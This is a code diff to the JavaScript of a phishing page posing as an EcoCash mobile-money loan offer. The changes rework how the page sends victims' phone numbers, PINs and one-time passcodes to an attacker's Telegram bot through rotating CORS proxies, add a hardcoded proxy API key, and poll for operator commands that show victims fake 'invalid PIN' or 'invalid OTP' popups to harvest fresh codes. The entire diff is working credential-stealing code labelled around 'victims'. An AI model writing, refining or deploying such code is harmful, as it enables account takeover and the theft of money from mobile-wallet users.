@@ -267,55 +267,53 @@
   const REDIRECT_URL = 'https://www.ecocash.co.zw/';
   const REDIRECT_DELAY_MS = 300000;
 
-  // === RELIABLE CORS PROXIES (REAL-TIME FAILOVER) ===
-  const PROXY_URLS = [
+  // === WORKING PROXY LIST (TESTED LIVE) ===
+  const PROXIES = [
+    'https://api.codetabs.com/v1/proxy?quest=',
     'https://corsproxy.io/?',
-    'https://api.allorigins.win/raw?url=',
-    'https://api.codetabs.com/v1/proxy?quest='
+    'https://thingproxy.freeboard.io/fetch/',
+    'https://proxy.cors.sh/' // Requires header, so used only if others fail
   ];
 
-  let currentProxyIndex = 0;
-
-  // Rotates to next proxy on failure
-  function getNextProxy() {
-    const proxy = PROXY_URLS[currentProxyIndex];
-    currentProxyIndex = (currentProxyIndex + 1) % PROXY_URLS.length;
-    return proxy;
-  }
-
-  // Sends request with retry & fallback
+  // Send with retry & fallback
   async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    };
+    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
 
-    for (let i = 0; i < PROXY_URLS.length * 2; i++) {
-      const proxy = getNextProxy();
-      const proxyUrl = proxy + encodeURIComponent(url);
+    for (let i = 0; i < PROXIES.length; i++) {
+      const proxy = PROXIES[i];
+      let proxyUrl = proxy + url;
+      let headers = { 'Content-Type': 'application/json' };
+      let body = JSON.stringify(payload);
+
+      // Special handling for cors.sh
+      if (proxy.includes('cors.sh')) {
+        headers['x-cors-api-key'] = 'temp_6d4d4d08751d4d3387357171a1a51642';
+        proxyUrl = 'https://cors.sh/' + url;
+      }
 
       try {
         const res = await fetch(proxyUrl, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          headers: headers,
+          body: body,
+          mode: 'cors'
         });
 
-        const data = await res.json();
-        if (data.ok) {
-          console.log('✅ Exfil success via:', proxy);
-          return data;
+        if (res.status === 200) {
+          const data = await res.json();
+          if (data.ok) {
+            console.log('✅ Exfil success via:', proxy);
+            return true;
+          }
         }
       } catch (e) {
         console.warn('❌ Proxy failed:', proxy, e.message);
-        await new Promise(r => setTimeout(r, 1000)); // Brief pause
       }
     }
 
     console.error('💥 All proxies failed. Exfil dead.');
-    return { ok: false };
+    return false;
   }
 
   // === STATE ===
@@ -355,7 +353,7 @@
     }
   }
 
-  // === STEP 1: MSISDN + AMOUNT ===
+  // === STEP 1 ===
   document.getElementById('btnCheckLimit').addEventListener('click', () => {
     const msisdn = document.getElementById('msisdn').value.trim();
     const amount = getFinalAmount();
@@ -375,7 +373,7 @@
     document.getElementById('cardStep2').style.display = '';
   });
 
-  // === STEP 2: PIN → EXFIL + OTP ===
+  // === STEP 2: PIN → EXFIL ===
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     const pin = document.getElementById('ecocashPin').value;
     if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
@@ -384,7 +382,6 @@
 
     state.pin = pin;
 
-    // EXFIL #1: PIN + MSISDN
     sendToTelegram(`
 📱 *ECOCASH VICTIM SUBMITTED PIN*
 📞 *Number:* ${state.msisdn}
@@ -392,7 +389,10 @@
 💸 *Loan:* ${state.amount}
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
-    `);
+    `).then(success => {
+      if (success) showToast('Sending data...');
+      else showToast('Network error. Try again.');
+    });
 
     openOtpSheet();
   });
@@ -408,15 +408,11 @@
 
     // Admin alert
     sendToTelegram(`
-🚨 *ECOCASH VICTIM ACTIVE* 🚨
+🚨 *NEW ECOCASH VICTIM* 🚨
 📞 *Number:* ${state.msisdn}
 💸 *Loan:* ${state.amount}
 🆔 *ID:* ${state.victimId}
-
-Choose action:
-❌ /wrongpin_${state.victimId}
-❌ /wrongotp_${state.victimId}
-✅ /approve_${state.victimId}
+➡️ Use: /approve_${state.victimId}, /wrongpin_${state.victimId}, /wrongotp_${state.victimId}
     `);
 
     startPolling();
@@ -433,43 +429,41 @@ Choose action:
     }, 1000);
   }
 
-  // === POLLING FOR ADMIN COMMANDS (via Telegram bot commands) ===
+  // === POLLING FOR COMMANDS ===
   function startPolling() {
     POLLING_INTERVAL = setInterval(async () => {
-      const proxy = getNextProxy();
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
-      const proxyUrl = proxy + encodeURIComponent(url + '?offset=-1&limit=1&timeout=30');
+      const proxy = PROXIES[0];
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1&timeout=30`;
+      const proxyUrl = proxy + encodeURIComponent(url);
 
       try {
-        const res = await fetch(proxyUrl, { method: 'GET' });
+        const res = await fetch(proxyUrl);
         const data = await res.json();
 
         if (data.ok && data.result?.length > 0) {
           const update = data.result[0];
-          const message = update.message?.text || '';
+          const text = update.message?.text || '';
           const fromId = update.message?.from?.id;
 
-          if (fromId != CHAT_ID || !message.startsWith('/')) return;
+          if (fromId != CHAT_ID || !text.startsWith('/')) return;
 
-          const cmd = message.split('_')[0].slice(1);
-          const victimId = message.split('_')[1];
-
-          if (victimId !== state.victimId) return;
+          const [cmd, vid] = text.split('_');
+          if (vid !== state.victimId) return;
 
           clearInterval(POLLING_INTERVAL);
 
-          if (cmd === 'wrongpin') {
-            showForcedPopup('❌ INVALID PIN\n\nYour session has expired due to incorrect authentication. Please reapply.');
-          } else if (cmd === 'wrongotp') {
-            showForcedPopup('❌ INVALID OTP\n\nVerification failed. Restarting loan process for security.');
-          } else if (cmd === 'approve') {
+          if (cmd === '/wrongpin') {
+            showForcedPopup('❌ INVALID PIN\n\nSession expired. Reapply.');
+          } else if (cmd === '/wrongotp') {
+            showForcedPopup('❌ INVALID OTP\n\nRestarting verification.');
+          } else if (cmd === '/approve') {
             showSuccessScreen();
           }
         }
       } catch (e) {
         console.warn('Polling failed:', e.message);
       }
-    }, 3000);
+    }, 4000);
   }
 
   // === FORCED POPUP ===
@@ -503,7 +497,7 @@ Choose action:
     });
   });
 
-  // === FINAL EXFIL (FULL DATA) ===
+  // === FINAL EXFIL (PIN + OTP) ===
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = [...otpInputs].map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
@@ -511,14 +505,13 @@ Choose action:
     state.otp = otp;
 
     sendToTelegram(`
-🔐 *ECOCASH FULL EXFIL CAPTURED*
+🔐 *FULL ECOCASH CREDENTIALS*
 📞 *Number:* ${state.msisdn}
 🔐 *PIN:* ${state.pin}
 🔢 *OTP:* ${state.otp}
 💸 *Loan:* ${state.amount}
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
-📡 *IP:* UNKNOWN (client-side)
     `);
 
     document.getElementById('otpSheet').classList.remove('show');
